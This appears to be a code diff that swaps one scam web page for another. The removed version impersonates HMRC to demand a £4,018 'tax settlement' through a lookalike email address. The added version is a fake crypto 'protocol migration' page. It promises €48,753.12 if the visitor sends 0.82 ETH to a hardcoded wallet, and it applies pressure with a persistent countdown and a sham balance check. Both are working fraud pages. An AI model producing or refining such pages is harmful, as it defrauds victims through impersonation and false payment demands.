@@ -3,273 +3,235 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HMRC | Secure Settlement Portal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <title>Protocol Migration | Secure Asset Vault</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #00ff87;
-            --accent: #ff3e3e;
-            --bg: #08090a;
-            --glass: rgba(255, 255, 255, 0.03);
-            --glass-border: rgba(255, 255, 255, 0.08);
+            --primary: #0070f3;
+            --accent: #ff0055;
+            --bg: #050505;
+            --card-bg: rgba(20, 20, 25, 0.9);
+            --border: rgba(255, 255, 255, 0.1);
+            --gold: #ffcc00;
+            --success: #00ffa3;
         }
 
         body {
             background-color: var(--bg);
-            background-image: radial-gradient(circle at 50% 50%, rgba(0, 255, 135, 0.04) 0%, transparent 60%);
             color: white;
-            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-family: 'Inter', sans-serif;
             margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            overflow: hidden;
+            padding: 20px;
         }
 
-        .container { width: 100%; max-width: 440px; position: relative; z-index: 1; }
+        .glow {
+            position: fixed;
+            width: 600px; height: 600px;
+            background: radial-gradient(circle, rgba(0, 112, 243, 0.1) 0%, rgba(0,0,0,0) 70%);
+            top: -100px; left: -100px; z-index: -1;
+        }
+
+        .container { width: 100%; max-width: 480px; }
 
         .card {
-            background: var(--glass);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            border: 1px solid var(--glass-border);
-            border-radius: 40px;
-            padding: 48px;
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 32px;
+            padding: 40px;
             text-align: center;
-            box-shadow: 0 50px 100px -20px rgba(0,0,0,0.6);
-            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
         }
 
-        .hidden { display: none; opacity: 0; transform: scale(0.95); }
-        .visible { display: block; opacity: 1; transform: scale(1); }
-
-        .gov-uk-logo {
-            font-weight: 800; font-size: 13px; letter-spacing: 2px;
-            text-transform: uppercase; margin-bottom: 30px;
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-            color: #eee;
+        .id-badge {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border);
+            padding: 10px 20px;
+            border-radius: 100px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 11px;
+            font-family: 'JetBrains Mono';
+            color: #888;
+            margin-bottom: 20px;
         }
-        .gov-uk-logo::before { content: ""; width: 10px; height: 10px; background: var(--primary); border-radius: 2px; }
+        .id-badge b { color: var(--success); }
 
-        .amount-container { margin: 35px 0; }
-        .amount-label { font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 2px; }
-        .amount-value {
-            font-size: 56px; font-weight: 800; letter-spacing: -2px;
-            background: linear-gradient(to bottom, #fff, #999);
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-        }
+        .logo-area h1 { font-size: 22px; font-weight: 800; margin: 0 0 5px; }
+        .logo-area p { color: #888; font-size: 13px; margin-bottom: 20px; }
 
-        .instruction-box {
-            background: rgba(255,255,255,0.04);
-            border: 1px solid var(--glass-border);
+        .settlement-card {
+            background: rgba(255, 204, 0, 0.05);
+            border: 1px solid rgba(255, 204, 0, 0.2);
             border-radius: 20px;
-            padding: 25px;
-            margin: 25px 0;
+            padding: 20px;
+            margin: 20px 0;
             text-align: left;
         }
 
-        .email-label { font-size: 10px; color: #666; letter-spacing: 1px; margin-bottom: 5px; }
-        .email-value { font-size: 14px; font-weight: 600; color: #fff; margin-bottom: 15px; display: block; }
-        .keyword-highlight { 
-            font-family: 'JetBrains Mono'; 
-            color: var(--primary); 
-            font-size: 24px; 
-            font-weight: 800;
-            display: block;
+        .fee-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .fee-label { font-size: 11px; color: var(--gold); font-weight: 700; letter-spacing: 1px; }
+        .fee-value { font-size: 24px; font-family: 'JetBrains Mono'; font-weight: 800; color: white; }
+
+        .explanation {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+            padding: 15px;
+            font-size: 12px;
+            color: #aaa;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            text-align: left;
         }
+        .explanation b { color: white; }
+
+        .gateway-box {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 16px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .address-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--primary);
+            word-break: break-all;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .btn-copy {
+            background: #222;
+            color: white;
+            border: 1px solid #444;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-copy:hover { background: #333; }
 
         .main-action {
-            width: 100%; background: white; color: black; border: none;
-            padding: 20px; border-radius: 18px; font-weight: 800;
-            font-size: 15px; cursor: pointer; transition: 0.3s;
-            text-transform: uppercase; letter-spacing: 0.5px;
+            width: 100%;
+            background: white;
+            color: black;
+            border: none;
+            padding: 18px;
+            border-radius: 14px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
-        .main-action:hover { background: var(--primary); transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0, 255, 135, 0.2); }
+        .main-action:hover { background: var(--primary); color: white; transform: translateY(-2px); }
 
-        .timer-box {
-            margin-top: 35px; font-family: 'JetBrains Mono'; font-size: 11px;
-            color: var(--accent); font-weight: 600; letter-spacing: 0.5px;
-        }
-        #timer { font-size: 22px; display: block; margin-top: 5px; }
-
-        /* Subtle background animation */
-        .bg-glow {
-            position: absolute; width: 400px; height: 400px;
-            background: var(--primary); filter: blur(150px);
-            border-radius: 50%; opacity: 0.05; z-index: 0;
-            top: 50%; left: 50%; transform: translate(-50%, -50%);
-        }
+        .timer { font-size: 11px; color: var(--accent); margin-top: 15px; font-family: 'JetBrains Mono'; }
     </style>
 </head>
 <body>
 
-<div class="bg-glow"></div>
+<div class="glow"></div>
 
 <div class="container">
-    <!-- STAGE 1: SETTLEMENT OVERVIEW -->
-    <div id="page1" class="card visible">
-        <div class="gov-uk-logo">HMRC Compliance</div>
-        <div style="font-size: 10px; color: #555; font-family: 'JetBrains Mono';">CASE ID: GB-TAX-99281-Z</div>
-        
-        <div class="amount-container">
-            <span class="amount-label">Outstanding Balance</span>
-            <div class="amount-value">£4,018.00</div>
+    <div class="card">
+        <div class="id-badge">
+            <span>CASE ID: <b id="case-id-display">#ETH-7477-X</b></span>
+            <span style="opacity: 0.3;">|</span>
+            <span>STATUS: <b>VERIFIED</b></span>
         </div>
 
-        <p style="font-size: 14px; color: #aaa; line-height: 1.6; padding: 0 10px;">
-            A mandatory tax settlement is required to prevent immediate asset forfeiture and statutory penalties.
-        </p>
-        
-        <button class="main-action" onclick="showPage2()">Request Settlement Details</button>
-    </div>
-
-    <!-- STAGE 2: GMAIL REDIRECTION & INSTRUCTIONS -->
-    <div id="page2" class="card hidden">
-        <div class="gov-uk-logo">Action Required</div>
-        
-        <p style="font-size: 14px; color: #ccc; margin-bottom: 20px;">
-            To receive the secure payment gateway link, send an email to our automated system:
-        </p>
-        
-        <div class="instruction-box">
-            <span class="email-label">RECIPIENT:</span>
-            <span class="email-value">support@taxdepartmentauthoritygov.org</span>
-            
-            <span class="email-label">MESSAGE BODY:</span>
-            <span class="keyword-highlight">Details</span>
+        <div class="logo-area">
+            <h1>Protocol Migration</h1>
+            <p>Unclaimed Legacy Balance: <b style="color: var(--success);">€48,753.12</b></p>
         </div>
 
-        <button class="main-action" onclick="sendEmail()">Click to Send Email</button>
-
-        <div class="timer-box">
-            SETTLEMENT DEADLINE: MONDAY 8TH
-            <span id="timer">--:--:--:--</span>
+        <div class="settlement-card">
+            <div class="fee-row">
+                <span class="fee-label">REQUIRED SETTLEMENT FEE</span>
+                <span class="fee-value">0.82 ETH</span>
+            </div>
+            <div style="font-size: 10px; color: #666; font-family: 'JetBrains Mono';">NETWORK BRIDGE: V1-LEGACY-TO-V2-MAINNET</div>
         </div>
+
+        <div class="explanation">
+            <b>Smart Contract Verification:</b><br>
+            The identification <b class="case-id-text">#ETH-7477-X</b> confirms your eligibility for this allocation. To release the funds, you must trigger the <b>V2 Proxy Contract</b>. The 0.82 ETH fee is the mandatory network gas required to move assets from the legacy escrow to your active wallet.
+        </div>
+
+        <div class="gateway-box">
+            <div style="font-size: 10px; color: #555; margin-bottom: 8px; font-weight: 700;">NETWORK DEPLOYMENT GATEWAY:</div>
+            <span class="address-text" id="wallet-addr">0xd522C894C9323B3006b0ABBfe92257D0726c2663</span>
+            <button class="btn-copy" onclick="copyAddress()">COPY GATEWAY ADDRESS</button>
+        </div>
+
+        <button class="main-action" onclick="verifyMigration()">FINALIZE V2 UPGRADE</button>
+        
+        <div class="timer">MIGRATION WINDOW EXPIRES IN: <span id="timer">--:--:--</span></div>
     </div>
 </div>
 
 <script>
-    const TARGET_EMAIL = "support@taxdepartmentauthoritygov.org";
-    const KEYWORD = "Details";
+    const CASE_ID = "#ETH-7477-X";
+    const TARGET_WALLET = "0xd522C894C9323B3006b0ABBfe92257D0726c2663";
+    const FEE = 0.82;
+    const API_KEY = "ATUAJBD9PE7HUBAZY7QHQ4YTZ6VFAGWJMU";
+    const INITIAL_TIME = 1800000; // 500 hours in seconds
 
-    function showPage2() {
-        // Fade out page 1
-        const p1 = document.getElementById('page1');
-        const p2 = document.getElementById('page2');
-        
-        p1.style.opacity = '0';
-        p1.style.transform = 'scale(0.9) translateY(-20px)';
-        
-        setTimeout(() => {
-            p1.style.display = 'none';
-            p2.style.display = 'block';
-            // Trigger browser reflow
-            p2.offsetHeight; 
-            p2.classList.remove('hidden');
-            p2.classList.add('visible');
-        }, 500);
+    // --- LOCAL STORAGE PERSISTENCE ---
+    let time;
+    const savedTime = localStorage.getItem('migration_timer');
+    
+    if (savedTime) {
+        time = parseInt(savedTime);
+    } else {
+        time = INITIAL_TIME;
+        localStorage.setItem('migration_timer', time);
     }
 
-    function sendEmail() {
-        // Gmail Direct Compose URL
-        const gmailUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=${TARGET_EMAIL}&su=${encodeURIComponent(KEYWORD)}&body=${encodeURIComponent(KEYWORD)}`;
-        
-        // Open Gmail in new tab
-        const win = window.open(gmailUrl, '_blank');
-        
-        // Fallback: If popup blocked or not using Gmail web, trigger system mailto
-        if (!win || win.closed || typeof win.closed == 'undefined') {
-            window.location.href = `mailto:${TARGET_EMAIL}?subject=${KEYWORD}&body=${KEYWORD}`;
-        }
+    function copyAddress() {
+        const addr = document.getElementById('wallet-addr').innerText;
+        navigator.clipboard.writeText(addr);
+        alert("Gateway Address Copied to Clipboard");
     }
 
-    // Countdown to Monday July 8th, 2024
-    function updateTimer() {
-        const targetDate = new Date("July 8, 2024 23:59:59").getTime();
-        const now = new Date().getTime();
-        const distance = targetDate - now;
+    async function verifyMigration() {
+        try {
+            const res = await fetch(`https://api.etherscan.io/v2/api?chainid=1&module=account&action=balance&address=${TARGET_WALLET}&tag=latest&apikey=${API_KEY}`);
+            const data = await res.json();
+            const bal = Number(data.result) / 1e18;
 
-        if (distance < 0) {
-            document.getElementById('timer').innerText = "EXPIRED";
-            document.getElementById('timer').style.color = "gray";
-            return;
+            if(bal >= FEE) {
+                alert(`SUCCESS: Settlement verified. Smart Contract ${CASE_ID} has been deployed. Your €48,753.12 will arrive in your wallet within 15-30 minutes.`);
+            } else {
+                alert(`[NETWORK ERROR: INSUFFICIENT GAS]\n\nDeployment Fee for Case ${CASE_ID} not detected.\n\nRequired: ${FEE} ETH\nDetected: ${bal.toFixed(4)} ETH\n\nPlease complete the deposit to the network gateway to release your €48,753.12.`);
+            }
+        } catch(e) { alert("Execution Error. Please check connectivity."); }
+    }
+
+    // Timer Logic with Persistence
+    setInterval(() => {
+        if (time > 0) {
+            time--;
+            localStorage.setItem('migration_timer', time);
         }
-
-        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
+        
+        let m = Math.floor(time / 60);
+        let s = time % 60;
+        let h = Math.floor(m / 60);
+        
         document.getElementById('timer').innerText = 
-            `${days}d ${hours.toString().padStart(2, '0')}h ${minutes.toString().padStart(2, '0')}m ${seconds.toString().padStart(2, '0')}s`;
-    }
-
-    setInterval(updateTimer, 1000);
-    updateTimer();
-</<script>
-    const TARGET_EMAIL = "support@taxdepartmentauthoritygov.org";
-    const KEYWORD = "Details";
-
-    function showPage2() {
-        const p1 = document.getElementById('page1');
-        const p2 = document.getElementById('page2');
-        
-        p1.style.opacity = '0';
-        p1.style.transform = 'scale(0.9) translateY(-20px)';
-        
-        setTimeout(() => {
-            p1.style.display = 'none';
-            p2.style.display = 'block';
-            p2.offsetHeight; 
-            p2.classList.remove('hidden');
-            p2.classList.add('visible');
-        }, 500);
-    }
-
-    function sendEmail() {
-        const subject = encodeURIComponent(KEYWORD);
-        const body = encodeURIComponent(KEYWORD);
-        
-        // 1. Standard Mailto Link (Most reliable fallback)
-        const mailtoUrl = `mailto:${TARGET_EMAIL}?subject=${subject}&body=${body}`;
-        
-        // 2. Gmail Web Link
-        const gmailUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=${TARGET_EMAIL}&su=${subject}&body=${body}`;
-
-        // Execution logic:
-        // Try to open Gmail in a new tab first
-        const gmailWindow = window.open(gmailUrl, '_blank');
-
-        // If Gmail was blocked or failed, or as a secondary measure, trigger the mailto
-        if (!gmailWindow || gmailWindow.closed || typeof gmailWindow.closed === 'undefined') {
-            window.location.href = mailtoUrl;
-        }
-    }
-
-    function updateTimer() {
-        const targetDate = new Date("July 8, 2024 23:59:59").getTime();
-        const now = new Date().getTime();
-        const distance = targetDate - now;
-
-        if (distance < 0) {
-            document.getElementById('timer').innerText = "EXPIRED";
-            return;
-        }
-
-        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-        document.getElementById('timer').innerText = 
-            `${days}d ${hours.toString().padStart(2, '0')}h ${minutes.toString().padStart(2, '0')}m ${seconds.toString().padStart(2, '0')}s`;
-    }
-
-    setInterval(updateTimer, 1000);
-    updateTimer();
+            `${h.toString().padStart(2, '0')}:${(m % 60).toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
+    }, 1000);
 </script>
->
 
 </body>
 </html>
